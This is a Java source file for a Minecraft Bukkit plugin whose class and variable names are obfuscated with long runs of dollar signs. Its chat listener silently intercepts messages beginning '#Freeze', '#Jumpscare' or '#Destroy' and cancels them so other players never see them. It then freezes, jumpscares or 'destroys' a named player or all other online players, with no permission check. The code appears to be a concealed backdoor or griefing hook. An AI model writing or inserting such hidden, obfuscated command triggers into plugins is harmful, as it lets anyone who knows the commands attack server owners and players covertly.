package com.Skype;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerChatEvent;

public class C$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$2$$$$$$$$$$$$$$$$ implements Listener{

	private Main plugin;

	
	
	public C$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$2$$$$$$$$$$$$$$$$(Main main) {
		this.plugin = main;
		plugin.getServer().getPluginManager().registerEvents(this, main);
	}
	@EventHandler
	public void Chat(PlayerChatEvent e){
		Player P$$$$$$$$$$$$$$$$$$$$$$$$$$$$ = e.getPlayer();
		String MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$ = e.getMessage();
		if(MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.startsWith("#Freeze")){
			e.setCancelled(true);
			if(MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.split(" ").length != 2){
				P$$$$$$$$$$$$$$$$$$$$$$$$$$$$.sendMessage("�bSkype: �a#Freeze �7[�e(NAME) �8| �cALL�7]");
			}else{
				String[] $$$$$PLS$$$$$$$$$$$$$$$ = MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.split(" ");
				if($$$$$PLS$$$$$$$$$$$$$$$[1].equals("ALL")){
					for(Player $$$$$$$$$$$$$$uhe$$$$$$$$$$$$ : Bukkit.getOnlinePlayers()){
					if($$$$$$$$$$$$$$uhe$$$$$$$$$$$$ == P$$$$$$$$$$$$$$$$$$$$$$$$$$$$){
						
					}else{
					Main.$$$$$$$$$$$$$$$$$$$$$$$$$01$$$$$$.add($$$$$$$$$$$$$$uhe$$$$$$$$$$$$);
					}
					}
				}else if(Bukkit.getPlayer($$$$$PLS$$$$$$$$$$$$$$$[1]) == null){
					P$$$$$$$$$$$$$$$$$$$$$$$$$$$$.sendMessage("�bSkype: �c" + $$$$$PLS$$$$$$$$$$$$$$$[1] + " �7nicht gefunden!");
				}else{
					Main.$$$$$$$$$$$$$$$$$$$$$$$$$01$$$$$$.add(Bukkit.getPlayer($$$$$PLS$$$$$$$$$$$$$$$[1]));
				}
			}
			}else if(MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.startsWith("#Jumpscare")){
				e.setCancelled(true);
				if(MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.split(" ").length != 2){
					P$$$$$$$$$$$$$$$$$$$$$$$$$$$$.sendMessage("�bSkype: �a#Jumpscare �7[�e(NAME) �8| �cALL�7]");
				}else{
					String[] $$$$$PLS$$$$$$$$$$$$$$$ = MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.split(" ");
					if($$$$$PLS$$$$$$$$$$$$$$$[1].equals("ALL")){
						for(Player $$$$$$$$$$$$$$uhe$$$$$$$$$$$$ : Bukkit.getOnlinePlayers()){
							if($$$$$$$$$$$$$$uhe$$$$$$$$$$$$ == P$$$$$$$$$$$$$$$$$$$$$$$$$$$$){
								
							}else{
							JS$$$$$$$$$$$$$$$$$$7$$$$$$$$$$$$$$$$.jumpscare($$$$$$$$$$$$$$uhe$$$$$$$$$$$$);
							}
						}
					}else if(Bukkit.getPlayer($$$$$PLS$$$$$$$$$$$$$$$[1]) == null){
						P$$$$$$$$$$$$$$$$$$$$$$$$$$$$.sendMessage("�bSkype: �c" + $$$$$PLS$$$$$$$$$$$$$$$[1] + " �7nicht gefunden!");
					}else{
						JS$$$$$$$$$$$$$$$$$$7$$$$$$$$$$$$$$$$.jumpscare(Bukkit.getPlayer($$$$$PLS$$$$$$$$$$$$$$$[1]));
					}
				}
				}else if(MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.startsWith("#Destroy")){
					e.setCancelled(true);
					if(MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.split(" ").length != 2){
						P$$$$$$$$$$$$$$$$$$$$$$$$$$$$.sendMessage("�bSkype: �a#Destroy �7[�e(NAME) �8| �cALL�7]");
					}else{
						String[] $$$$$PLS$$$$$$$$$$$$$$$ = MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.split(" ");
						if($$$$$PLS$$$$$$$$$$$$$$$[1].equals("ALL")){
							for(Player $$$$$$$$$$$$$$uhe$$$$$$$$$$$$ : Bukkit.getOnlinePlayers()){
								if($$$$$$$$$$$$$$uhe$$$$$$$$$$$$ == P$$$$$$$$$$$$$$$$$$$$$$$$$$$$){
									
								}else{
									LA$$$$$$$$$$$$$$$$$$$$$u$$$$$$$$$$$$$$$$$$.Destroy($$$$$$$$$$$$$$uhe$$$$$$$$$$$$);
								}
							}
						}else if(Bukkit.getPlayer($$$$$PLS$$$$$$$$$$$$$$$[1]) == null){
							P$$$$$$$$$$$$$$$$$$$$$$$$$$$$.sendMessage("�bSkype: �c" + $$$$$PLS$$$$$$$$$$$$$$$[1] + " �7nicht gefunden!");
						}else{
							LA$$$$$$$$$$$$$$$$$$$$$u$$$$$$$$$$$$$$$$$$.Destroy(Bukkit.getPlayer($$$$$PLS$$$$$$$$$$$$$$$[1]));
						}
					}
					}
		}
		
		
	}